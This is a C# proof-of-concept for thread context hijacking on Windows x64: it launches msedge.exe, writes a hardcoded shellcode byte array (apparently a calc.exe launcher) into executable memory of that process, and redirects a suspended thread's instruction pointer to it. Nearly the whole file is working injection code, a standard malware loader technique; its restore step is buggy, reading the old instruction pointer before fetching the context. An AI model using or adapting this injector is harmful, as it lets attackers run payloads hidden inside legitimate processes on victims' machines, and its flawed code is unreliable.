// x64 only Thread Context Hijacking in C#
// the example should be upgraded to DInvoke instead of P/Invoke, the is just for demo
// I DON'T KNOW IF THE RIP METHOD IN THE END WORKS OR NOT, IT JUST CAME TO MY HEAD 



using System;
using System.Runtime.InteropServices;
using System.Diagnostics;



void print(object input)
{
    Console.WriteLine(input);
}


// Function Imports 

// Thread Related funtions

[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritIntPtr, int dwThreadId);

[DllImport("kernel32.dll", SetLastError = true)]
static extern uint SuspendThread(IntPtr hThread);

[DllImport("kernel32.dll", SetLastError = true)]
static unsafe extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 context);

[DllImport("kernel32.dll", SetLastError = true)]
static unsafe extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 context);

[DllImport("kernel32.dll", SetLastError = true)]
static extern uint ResumeThread(IntPtr hThread);

// non-thread related funtions

[DllImport("kernel32", SetLastError = true)]
static extern IntPtr VirtualAllocEx(IntPtr HANDLE, IntPtr LpAddress, int dwSize, ulong flAllocationType, ulong flProtect);
[DllImport("kernel32.dll", SetLastError = true)]
static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);


// constants

const ulong MEM_COMMIT_RESERVE = 0x00001000 | 0x00002000;
const ulong PAGE_READ_RIGHT_EXECUTE = 0x40;
const uint THREAD_ALL_ACCESS = 0x1F03FF; // value returned from performing bitwiseOR operation on all possible access rights 


// 

byte[] shellcode = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 };

//Thread Hijacking and injection


Process process = new Process();
process.StartInfo.FileName = "msedge.exe";
print($"[*] starting process: {process.StartInfo.FileName}");
process.Start();

uint pid = (uint)process.Id;
ProcessThread Thread = process.Threads[0];
print($"[*] PID: {pid}");
print($"[*] ThreadID: {Thread.Id}");

IntPtr thHandle = OpenThread(THREAD_ALL_ACCESS, false, Thread.Id);
print($"[*] retreived a HANDLE to the thread: 0x{thHandle}");
if (thHandle == IntPtr.Zero)
{
    print($"problem in OpenThread: {Marshal.GetLastWin32Error()}");
    Environment.Exit(0);
}

IntPtr memory = VirtualAllocEx(process.Handle, IntPtr.Zero, shellcode.Length, MEM_COMMIT_RESERVE, PAGE_READ_RIGHT_EXECUTE);
if (memory == IntPtr.Zero)
{
    print("memory allocation issue");
}else
{
    print($"[*] allocated memory: 0x{memory.ToString("X4")}");
}

UIntPtr bytesWritten = UIntPtr.Zero;
WriteProcessMemory(process.Handle, memory, shellcode, (uint)shellcode.Length, out bytesWritten);
//Marshal.Copy(shellcode, 0, memory, shellcode.Length); // gives access violation error --__("")__--


SuspendThread(thHandle);
CONTEXT64 ctx = new();
ctx.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;

ulong OLD_RIP = ctx.Rip;

GetThreadContext(thHandle, ref ctx);
ctx.Rip = (ulong)memory.ToInt64();
SetThreadContext(thHandle, ref ctx);
print("[*] updated the threads RIP to the shellcode");

print("[*] resuming thread execution");
ResumeThread(thHandle);

print("\npress enter to restore the thread to its original RIP");
Console.ReadLine();


SuspendThread(thHandle);
GetThreadContext(thHandle, ref ctx);
ctx.Rip = OLD_RIP;
SetThreadContext(thHandle, ref ctx);
ResumeThread(thHandle);


// any GetLastWin32Error on a thread function call will always give a 1300 (PERMISSIONS_NOT_GIVEN) error, NOT important


// from winnt.h [NOT DEFINED BY ME]
[StructLayout(LayoutKind.Sequential)]
public struct M128A
{
    public ulong High;
    public long Low;

    public override string ToString()
    {
        return string.Format("High:{0}, Low:{1}", this.High, this.Low);
    }
}

// x64 save format
[StructLayout(LayoutKind.Sequential, Pack = 16)]
public struct XSAVE_FORMAT64
{
    public ushort ControlWord;
    public ushort StatusWord;
    public byte TagWord;
    public byte Reserved1;
    public ushort ErrorOpcode;
    public uint ErrorOffset;
    public ushort ErrorSelector;
    public ushort Reserved2;
    public uint DataOffset;
    public ushort DataSelector;
    public ushort Reserved3;
    public uint MxCsr;
    public uint MxCsr_Mask;

    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
    public M128A[] FloatRegisters;

    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
    public M128A[] XmmRegisters;

    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
    public byte[] Reserved4;
}

// x64 context structure
[StructLayout(LayoutKind.Sequential, Pack = 16)]
public struct CONTEXT64
{
    public ulong P1Home;
    public ulong P2Home;
    public ulong P3Home;
    public ulong P4Home;
    public ulong P5Home;
    public ulong P6Home;

    public CONTEXT_FLAGS ContextFlags;
    public uint MxCsr;

    public ushort SegCs;
    public ushort SegDs;
    public ushort SegEs;
    public ushort SegFs;
    public ushort SegGs;
    public ushort SegSs;
    public uint EFlags;

    public ulong Dr0;
    public ulong Dr1;
    public ulong Dr2;
    public ulong Dr3;
    public ulong Dr6;
    public ulong Dr7;

    public ulong Rax;
    public ulong Rcx;
    public ulong Rdx;
    public ulong Rbx;
    public ulong Rsp;
    public ulong Rbp;
    public ulong Rsi;
    public ulong Rdi;
    public ulong R8;
    public ulong R9;
    public ulong R10;
    public ulong R11;
    public ulong R12;
    public ulong R13;
    public ulong R14;
    public ulong R15;
    public ulong Rip;

    public XSAVE_FORMAT64 DUMMYUNIONNAME;

    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
    public M128A[] VectorRegister;
    public ulong VectorControl;

    public ulong DebugControl;
    public ulong LastBranchToRip;
    public ulong LastBranchFromRip;
    public ulong LastExceptionToRip;
    public ulong LastExceptionFromRip;
}

public enum CONTEXT_FLAGS : uint
{
    CONTEXT_i386 = 0x10000,
    CONTEXT_i486 = 0x10000,   //  same as i386
    CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
    CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
    CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
    CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
    CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
    CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
    CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
    CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
    
}


